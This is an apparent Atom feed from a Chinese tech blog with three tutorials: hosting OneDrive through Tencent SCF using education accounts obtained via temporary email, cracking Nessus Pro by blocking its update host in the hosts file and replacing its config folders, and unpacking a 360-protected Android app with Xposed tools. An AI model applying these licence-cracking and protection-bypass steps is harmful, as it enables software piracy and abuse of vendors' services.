<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>madcoding’s blog</title>
  
  <subtitle>学习，沉淀，分享，交流</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://www.mad-coding.cn/"/>
  <updated>2019-12-02T06:27:00.936Z</updated>
  <id>https://www.mad-coding.cn/</id>
  
  <author>
    <name>madcoding</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>使用腾讯SCF+onedrive搭建5T个人网盘</title>
    <link href="https://www.mad-coding.cn/2019/12/02/%E4%BD%BF%E7%94%A8%E8%85%BE%E8%AE%AFSCF-onedrive%E6%90%AD%E5%BB%BA5T%E4%B8%AA%E4%BA%BA%E7%BD%91%E7%9B%98/"/>
    <id>https://www.mad-coding.cn/2019/12/02/使用腾讯SCF-onedrive搭建5T个人网盘/</id>
    <published>2019-12-02T00:56:09.000Z</published>
    <updated>2019-12-02T06:27:00.936Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>前几日在群里看到有人使用腾讯的SCF（云函数）+onedrive来搭建属于自己的个人网盘，对此我颇有兴趣今日就来研究研究，今将研究结果奉上，如有不足之处，还请提出改正，共同进步。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202093328.png" class="lozad"></p><a id="more"></a><h1 id="0x01-需求准备"><a href="#0x01-需求准备" class="headerlink" title="0x01 需求准备"></a>0x01 需求准备</h1><ol><li>onedrive账号（推荐教育版5T）</li><li>onedrive_SCF源码</li><li>个人域名</li><li>腾讯云账号</li></ol><h1 id="0x02-申请5T空间"><a href="#0x02-申请5T空间" class="headerlink" title="0x02 申请5T空间"></a>0x02 申请5T空间</h1><p>原理就是使用临时邮箱申请5T空间，之前的那个申请网站由于被人恶意使用短信炸弹轰炸，已经不能收到短信了，所以，今天推荐另一个网站。</p><blockquote><p>ps:个人不保证不会翻车，大家可以用来做自己的备份云盘。</p></blockquote><p>申请5T空间：<a href="http://233455.xyz:3000/" target="_blank" rel="noopener">传送门</a></p><p>申请教程可参考我的另一篇文章：<a href="[https://www.mad-coding.cn/2019/08/09/onedrive-oneindex%E6%89%93%E9%80%A0%E5%B1%9E%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E7%BD%91%E7%9B%98/](https://www.mad-coding.cn/2019/08/09/onedrive-oneindex打造属于自己的个人网盘/)">onedrive+oneindex打造属于自己的个人网盘</a></p><h1 id="0x03-开启搭建之路"><a href="#0x03-开启搭建之路" class="headerlink" title="0x03 开启搭建之路"></a>0x03 开启搭建之路</h1><h2 id="3-1-下载-onedrive-SCF源码"><a href="#3-1-下载-onedrive-SCF源码" class="headerlink" title="3.1 下载 onedrive_SCF源码"></a>3.1 下载 onedrive_SCF源码</h2><blockquote><p><a href="https://github.com/Tai7sy/OneDrive_SCF" target="_blank" rel="noopener">https://github.com/Tai7sy/OneDrive_SCF</a></p></blockquote><h2 id="3-2-注册腾讯云"><a href="#3-2-注册腾讯云" class="headerlink" title="3.2 注册腾讯云"></a>3.2 注册腾讯云</h2><blockquote><p><a href="https://cloud.tencent.com/" target="_blank" rel="noopener">https://cloud.tencent.com/</a></p></blockquote><h2 id="3-3-配置云函数"><a href="#3-3-配置云函数" class="headerlink" title="3.3 配置云函数"></a>3.3 配置云函数</h2><h3 id="3-3-1-新建云函数"><a href="#3-3-1-新建云函数" class="headerlink" title="3.3.1 新建云函数"></a>3.3.1 新建云函数</h3><p>登录腾讯云函数平台后，新建一个云函数，地区选择香港或者新加坡地区。创建的云函数名称随便填写，运行的环境选择PHP7.2 ，创建方式选择模板函数；模板选择helloword模板，下一步直接完成。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202095348.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202100001.png" class="lozad"></p><p>创建一个新的函数服务，地址选择<code>中国香港</code></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202100014.png" class="lozad"></p><p>新建一个<code>helloworld</code>模板函数</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202100021.png" class="lozad"></p><p>拉到最下面，点击下一步，然后点击完成</p><h3 id="3-3-2-上传onedrive-SCF文件夹"><a href="#3-3-2-上传onedrive-SCF文件夹" class="headerlink" title="3.3.2 上传onedrive_SCF文件夹"></a>3.3.2 上传onedrive_SCF文件夹</h3><p>从GitHub下载OneDrive_SCF源码，进入函数服务选择函数代码，提交代码选择本地上传文件夹，上传刚才解压的文件夹（注意：如果解压了双层文件夹需要点入第二个文件夹）</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202100324.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202100422.png" class="lozad"></p><h3 id="3-3-3-添加触发方式"><a href="#3-3-3-添加触发方式" class="headerlink" title="3.3.3 添加触发方式"></a>3.3.3 添加触发方式</h3><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202100428.png" class="lozad"></p><p>选择<code>API网关触发器</code>，勾选<code>启用集成响应</code>，然后点击保存。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202100634.png" class="lozad"></p><p>然后会生成一个访问路径。点击这个路径</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202101707.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202101712.png" class="lozad"></p><h3 id="3-3-4-新建密钥"><a href="#3-3-4-新建密钥" class="headerlink" title="3.3.4 新建密钥"></a>3.3.4 新建密钥</h3><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202101736.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202101746.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202101750.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202101819.png" class="lozad"></p><p>然后使用微信扫描二维码，获得密钥全部的内容</p><h3 id="3-3-5-添加环境变量"><a href="#3-3-5-添加环境变量" class="headerlink" title="3.3.5 添加环境变量"></a>3.3.5 添加环境变量</h3><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202101909.png" class="lozad"></p><p>将刚刚的新建的秘钥添加到环境变量中。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202101913.png" class="lozad"></p><p>添加完成</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202101919.png" class="lozad"></p><p>其他的环境变量添加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sitename=站点名称</span><br><span class="line">private_path=Onedrive根路径（绑定自定义域名使用）</span><br><span class="line">public_path=Onedrive根路径（未绑定自定义域名使用）</span><br><span class="line">passfile=.password(加密文件)</span><br><span class="line">admin=管理员密码</span><br></pre></td></tr></table></figure><h3 id="3-3-6-开始安装"><a href="#3-3-6-开始安装" class="headerlink" title="3.3.6 开始安装"></a>3.3.6 开始安装</h3><p>再次刷新刚刚的错误页面</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202101950.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202102007.png" class="lozad"></p><p>登录OneDrive账号，这里我已经登录过了，直接选择就行了。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202102013.png" class="lozad"></p><p>成功登录后自动跳转到云盘</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202102058.png" class="lozad"></p><h3 id="3-3-7-自定义域名设置"><a href="#3-3-7-自定义域名设置" class="headerlink" title="3.3.7 自定义域名设置"></a>3.3.7 自定义域名设置</h3><p>点击触发方式，然后点击API服务名</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202102115.png" class="lozad"></p><p>选择自定义域名，新建。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202102120.png" class="lozad"></p><p>在域名厂商设置域名解析，我域名是在腾讯买的，所以直接到域名解析出添加一个域名解析记录，主机记录就是二级域名，记录类型是CNAME（域名指向域名），记录值填触发方式中的访问路径。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202102128.png" class="lozad"></p><p>设置完域名解析后，在到自定义域名除继续设置。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202102134.png" class="lozad"></p><blockquote><p>ps:没有证书的话，就选择http协议。</p></blockquote><p>在index.php中的609行左右，添加域名协议的代码</p><script>  if (location.protocol === "http:") {    location.href = location.href.replace(/http/, "https");  }</script><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202102138.png" class="lozad"></p><p>再次使用域名访问，显示没有uri路径设置有问题。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202102156.png" class="lozad"></p><p>重新修改路径</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202102203.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202102208.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202102212.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202102216.png" class="lozad"></p><p>再次使用域名访问</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202103229.png" class="lozad"></p><h1 id="0x04-采坑记录"><a href="#0x04-采坑记录" class="headerlink" title="0x04 采坑记录"></a>0x04 采坑记录</h1><h3 id="4-1-创建权限错误"><a href="#4-1-创建权限错误" class="headerlink" title="4.1 创建权限错误"></a>4.1 创建权限错误</h3><p>在创建API网管触发器的时候，出现操作未授权的错误，和教程不一样，网上也搜不到相关的信息。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202104550.png" class="lozad"></p><p>解决方法：其实就是用户自己没有授权，重新返回主页在点击去时会弹出授权，直接授权就好了。</p><h1 id="0x05-甩锅"><a href="#0x05-甩锅" class="headerlink" title="0x05 甩锅"></a>0x05 甩锅</h1><ol><li>教育版的5T空间可能会翻车，如果翻车，与作者无关奥。</li><li>腾讯SCF现在开始收费了，之前是免费的，所以大家可以当做一个技术来学习，当前，不在乎这点钱的话可以考虑继续使用奥，具体的收费标准请自己到官网查看。</li><li>设置了自定义域名后，可在互联网上直接发访问，所以一些私密的文件请不要上传到该网盘中，并且最好给文件夹加上密码，造成内部资料的泄露，作者不负责任奥。</li></ol><h1 id="0x06-参考连接"><a href="#0x06-参考连接" class="headerlink" title="0x06 参考连接"></a>0x06 参考连接</h1><p><a href="https://eebk.com/archives/30.html" target="_blank" rel="noopener">https://eebk.com/archives/30.html</a></p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;前几日在群里看到有人使用腾讯的SCF（云函数）+onedrive来搭建属于自己的个人网盘，对此我颇有兴趣今日就来研究研究，今将研究结果奉上，如有不足之处，还请提出改正，共同进步。&lt;/p&gt;
&lt;p&gt;&lt;img alt data-src=&quot;https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202093328.png&quot; class=&quot;lozad&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="其他文章" scheme="https://www.mad-coding.cn/categories/%E5%85%B6%E4%BB%96%E6%96%87%E7%AB%A0/"/>
    
    
      <category term="个人网盘" scheme="https://www.mad-coding.cn/tags/%E4%B8%AA%E4%BA%BA%E7%BD%91%E7%9B%98/"/>
    
      <category term="SCF" scheme="https://www.mad-coding.cn/tags/SCF/"/>
    
  </entry>
  
  <entry>
    <title>nessus pro破解安装及插件离线跟新</title>
    <link href="https://www.mad-coding.cn/2019/11/27/nessus-pro%E7%A0%B4%E8%A7%A3%E5%AE%89%E8%A3%85%E5%8F%8A%E6%8F%92%E4%BB%B6%E7%A6%BB%E7%BA%BF%E8%B7%9F%E6%96%B0/"/>
    <id>https://www.mad-coding.cn/2019/11/27/nessus-pro破解安装及插件离线跟新/</id>
    <published>2019-11-27T03:07:40.000Z</published>
    <updated>2019-11-27T08:59:20.330Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>nessus是扫描主机漏洞的扫描器中最流行的扫描器之一，有个人免费版本和专业版本。但是个人免费版本有很多功能上面的限制，所以，今天来给教大学如何安装破解成专业版的，并且离线跟新nessus的最新插件的方法</p><p><img alt="img" data-src="https://i03piccdn.sogoucdn.com/c33229afd072e890" class="lozad"></p><a id="more"></a><h1 id="0x01-安装环境"><a href="#0x01-安装环境" class="headerlink" title="0x01 安装环境"></a>0x01 安装环境</h1><blockquote><p>操作系统：Windows 7 x64</p><p>nessus版本：Nessus 8.2.3</p></blockquote><h1 id="0x02-安装nessus"><a href="#0x02-安装nessus" class="headerlink" title="0x02 安装nessus"></a>0x02 安装nessus</h1><p>安装包地址：</p><p>下载好安装包以后双击Nessus-8.2.3-x64(20190217).msi安装路径使用默认路径。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191127161358.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191127161622.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191127161635.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191127161710.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191127161724.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191127161825.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191127161839.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191127161852.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191127161907.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191127161924.png" class="lozad"></p><p>到这里安装完成</p><h1 id="0x03-停止Nessus服务"><a href="#0x03-停止Nessus服务" class="headerlink" title="0x03 停止Nessus服务"></a>0x03 停止Nessus服务</h1><p>按win+R键输入services.msc快速进入服务列表</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191127162131.png" class="lozad"></p><p>找到Tenable Nessus ，右击属性停止服务</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191127162252.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191127162350.png" class="lozad"></p><h1 id="0x04-屏蔽Nessus更新地址"><a href="#0x04-屏蔽Nessus更新地址" class="headerlink" title="0x04 屏蔽Nessus更新地址"></a>0x04 屏蔽Nessus更新地址</h1><p>为避免Nessus激活信息时效，需要在host文件中屏蔽Nessus更新地址。<br>修改<code>C:\Windows\System32\drivers\etc\hosts</code>文件，添加一行内容：<br>127.0.0.1 plugins.nessus.org</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191127162602.png" class="lozad"></p><p>写完以后保存发现需要另存为，并且自动保存为txt文本了，但是看不到后缀名</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191127162950.png" class="lozad"></p><p>【显示扩展名】</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191127163115.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191127163208.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191127163234.png" class="lozad"></p><p>然后删除原先的hosts，将新生成的hosts.txt后缀名删掉（重命名）</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191127163341.png" class="lozad"></p><h1 id="0x05-破解nessus"><a href="#0x05-破解nessus" class="headerlink" title="0x05 破解nessus"></a>0x05 破解nessus</h1><p>打开C:\ProgramData\Tenable\Nessus目录，删除已有的conf和nessus目录</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191127163753.png" class="lozad"></p><p>将压缩包中conf和nessus文件夹复制替换原来nessus安装目录下的文件</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191127163830.png" class="lozad"></p><p>在服务中启动Tenable Nessus服务，浏览器访问<a href="https://localhost:8834使用Nessus。" target="_blank" rel="noopener">https://localhost:8834使用Nessus。</a></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191127164017.png" class="lozad"></p><p>等待初始化完成</p><blockquote><p>账号：Nessus<br>密码：Nessus</p></blockquote><p>【破解前】</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191127164316.png" class="lozad"></p><p>【破解后】</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191127164158.png" class="lozad"></p><p>对比一下很容易发现，破解后的nessus解锁了很多功能，并且还解除了IP数量的限制。</p><h1 id="0x06-离线跟新"><a href="#0x06-离线跟新" class="headerlink" title="0x06 离线跟新"></a>0x06 离线跟新</h1><p>由于激活信息中硬件信息与本机不一致，无法使用在线更新，只能通过下载插件包离线更新.</p><p>刚刚安装的插件版本是：<code>Plugin Set：201904182242</code></p><p>【资源下载】</p><blockquote><p>链接: <a href="https://pan.baidu.com/s/1tPRWymDRwdB0V22ATC0PdQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1tPRWymDRwdB0V22ATC0PdQ</a> 提取码: v4wk</p></blockquote><p>将下载好的插件包文件all-2.0.tar.gz拷贝到<code>C:\Program Files\Tenable\Nessus</code>目录下</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191127165135.png" class="lozad"></p><p>打开CMD跳转到该目录，执行以下命令更新：</p><blockquote><p>nessuscli.exe update all-2.0.tar.gz</p></blockquote><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191127165301.png" class="lozad"></p><p>耐心等待一会，更新完成后，提示：</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191127165513.png" class="lozad"></p><p>说明跟新插件成功了。</p><p>【跟新插件前】</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191127165744.png" class="lozad"></p><p>【跟新插件后】</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191127165837.png" class="lozad"></p><p>对比一下可以发现，插件的数量增多了，plugin文件夹的大小也变大了。</p><h1 id="0x07-后记"><a href="#0x07-后记" class="headerlink" title="0x07 后记"></a>0x07 后记</h1><p>本次教程讲解了Nessus的安装与破解，下次教程会讲解如何使用nessus进行扫描测试。</p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;nessus是扫描主机漏洞的扫描器中最流行的扫描器之一，有个人免费版本和专业版本。但是个人免费版本有很多功能上面的限制，所以，今天来给教大学如何安装破解成专业版的，并且离线跟新nessus的最新插件的方法&lt;/p&gt;
&lt;p&gt;&lt;img alt=&quot;img&quot; data-src=&quot;https://i03piccdn.sogoucdn.com/c33229afd072e890&quot; class=&quot;lozad&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="神兵利器" scheme="https://www.mad-coding.cn/categories/%E7%A5%9E%E5%85%B5%E5%88%A9%E5%99%A8/"/>
    
    
      <category term="nessus" scheme="https://www.mad-coding.cn/tags/nessus/"/>
    
  </entry>
  
  <entry>
    <title>实战脱壳奇虎360</title>
    <link href="https://www.mad-coding.cn/2019/11/26/%E5%AE%9E%E6%88%98%E8%84%B1%E5%A3%B3%E5%A5%87%E8%99%8E360/"/>
    <id>https://www.mad-coding.cn/2019/11/26/实战脱壳奇虎360/</id>
    <published>2019-11-26T01:14:43.000Z</published>
    <updated>2019-11-26T06:43:05.270Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>在进行渗透测试的过程中，有时候需要对APP进行逆向分析，但是如果APP被加壳以后，就看不到里面的源代码了。所以我们需要对加壳的APP先进行脱壳处理。常用的加壳有：奇虎360，爱加密，梆梆安全等。今天给大家介绍的就是使用反射大师3.0脱360的壳。</p><a id="more"></a><h1 id="0x01-工具准备"><a href="#0x01-工具准备" class="headerlink" title="0x01 工具准备"></a>0x01 工具准备</h1><p>1.逍遥模拟器（需root） ：<a href="https://www.xyaz.cn/" target="_blank" rel="noopener">传送门</a></p><p>2.MT管理器 ：应用市场直接安装</p><p>3.xposed框架： </p><blockquote><p>链接: <a href="https://pan.baidu.com/s/1kWQDgKR" target="_blank" rel="noopener">百度网盘</a> 密码: 5ixp      版本3.15</p></blockquote><p>4.反射大师3.0 ：<a href="http://www.ddooo.com/softdown/158157.htm" target="_blank" rel="noopener">传送门</a></p><p>5.手机网管（脱壳示例应用）</p><h1 id="0x02-环境安装"><a href="#0x02-环境安装" class="headerlink" title="0x02 环境安装"></a>0x02 环境安装</h1><h2 id="2-1-安装逍遥模拟器"><a href="#2-1-安装逍遥模拟器" class="headerlink" title="2.1.安装逍遥模拟器"></a>2.1.安装逍遥模拟器</h2><p>傻瓜式安装，这里不再描述，默认开启root</p><h2 id="2-2-MT管理器"><a href="#2-2-MT管理器" class="headerlink" title="2.2.MT管理器"></a>2.2.MT管理器</h2><p>一个文件夹管理器，需要root</p><h2 id="3-3-xposed框架激活安装"><a href="#3-3-xposed框架激活安装" class="headerlink" title="3.3.xposed框架激活安装"></a>3.3.xposed框架激活安装</h2><p>将下载好的安装包直接拖进逍遥模拟器即可</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191126093549.png" class="lozad"></p><p>【激活框架】</p><p><strong>未激活状态</strong></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191126093824.png" class="lozad"></p><p>下载安装</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191126093851.png" class="lozad"></p><p>这个下载的过程需要等待一会，具体的速度和网速有关（小疑惑：用公司的wifi下载贼慢，自己的手机热点很快）</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191126094038.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191126094226.png" class="lozad"></p><p>安装完成后重新启动模拟器</p><p><strong>激活成功截图</strong></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191126093747.png" class="lozad"></p><p>4.反射大师3.0</p><p>将反射大师3.0的安装包直接拖进模拟器中安装即可。</p><p>安装成功了，需要到xposed框架中去激活反射大师。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191126094600.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191126094614.png" class="lozad"></p><p>将反射大师勾选上</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191126094628.png" class="lozad"></p><p>OK，到这里所有需要的工具和环境都准备完毕。</p><h1 id="0x03-开始逆向脱壳"><a href="#0x03-开始逆向脱壳" class="headerlink" title="0x03 开始逆向脱壳"></a>0x03 开始逆向脱壳</h1><h2 id="3-1-提取安装包"><a href="#3-1-提取安装包" class="headerlink" title="3.1 提取安装包"></a>3.1 提取安装包</h2><p>打开MT管理器，按照下面步骤提取安装包</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191126100017.gif" class="lozad"></p><h2 id="3-2-查看加密方式"><a href="#3-2-查看加密方式" class="headerlink" title="3.2 查看加密方式"></a>3.2 查看加密方式</h2><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191126140731.gif" class="lozad"></p><p>可以看到加壳方式为奇虎360</p><h2 id="3-3-开始脱壳"><a href="#3-3-开始脱壳" class="headerlink" title="3.3 开始脱壳"></a>3.3 开始脱壳</h2><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191126141257.gif" class="lozad"></p><h3 id="3-3-1-当前activity"><a href="#3-3-1-当前activity" class="headerlink" title="3.3.1 当前activity"></a>3.3.1 当前activity</h3><p>可以看到再次打开看到一个红色的五角星在屏幕中间。点击五角星在点击<code>当前ACTIVITY</code></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191126141619.png" class="lozad"></p><h3 id="3-3-2-getClass"><a href="#3-3-2-getClass" class="headerlink" title="3.3.2 getClass"></a>3.3.2 getClass</h3><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191126141743.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191126141855.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191126141937.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191126141951.png" class="lozad"></p><h3 id="3-3-3-getDex"><a href="#3-3-3-getDex" class="headerlink" title="3.3.3 getDex"></a>3.3.3 getDex</h3><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191126142014.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191126142125.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191126142154.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191126142211.png" class="lozad"></p><h3 id="3-3-4-getBytes"><a href="#3-3-4-getBytes" class="headerlink" title="3.3.4 getBytes"></a>3.3.4 getBytes</h3><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191126142233.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191126142349.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191126142404.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191126142413.png" class="lozad"></p><h3 id="3-3-5-导出dex文件"><a href="#3-3-5-导出dex文件" class="headerlink" title="3.3.5 导出dex文件"></a>3.3.5 导出dex文件</h3><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191126142428.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191126142505.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191126142531.png" class="lozad"></p><h2 id="3-4-查看脱壳效果"><a href="#3-4-查看脱壳效果" class="headerlink" title="3.4 查看脱壳效果"></a>3.4 查看脱壳效果</h2><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191126142705.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191126142742.png" class="lozad"></p><h3 id="3-4-1-脱壳前"><a href="#3-4-1-脱壳前" class="headerlink" title="3.4.1 脱壳前"></a>3.4.1 脱壳前</h3><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191126143700.png" class="lozad"></p><h3 id="3-4-2-脱壳后"><a href="#3-4-2-脱壳后" class="headerlink" title="3.4.2 脱壳后"></a>3.4.2 脱壳后</h3><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191126142759.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191126142829.png" class="lozad"></p><blockquote><p>这个脱壳的方式还有不足的，因为这个软件没有使用账号登录，所以登录之后的acticity还是混淆的状态。</p></blockquote><h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><p>学无止尽，不断学习，不断进步，共勉！</p><p><img alt="img" data-src="https://img03.sogoucdn.com/app/a/100520093/e18d20c94006dfe0-9eef65073f0f6be0-040f14dd58df251a392f0151d7f4762d.jpg" class="lozad"></p><hr>]]></content>
    
    <summary type="html">
    
